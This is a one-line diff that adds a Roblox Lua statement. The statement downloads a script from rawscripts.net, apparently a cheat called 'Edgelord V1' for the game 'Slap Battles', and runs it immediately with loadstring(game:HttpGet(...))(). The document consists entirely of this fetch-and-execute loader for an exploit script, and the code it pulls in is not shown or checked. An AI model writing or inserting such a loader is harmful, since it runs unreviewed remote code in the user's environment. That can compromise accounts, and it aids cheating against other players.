@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/UPDATE-Slap-Battles/Edgelord-V1-by-Incognito-Scripts-19599"))()
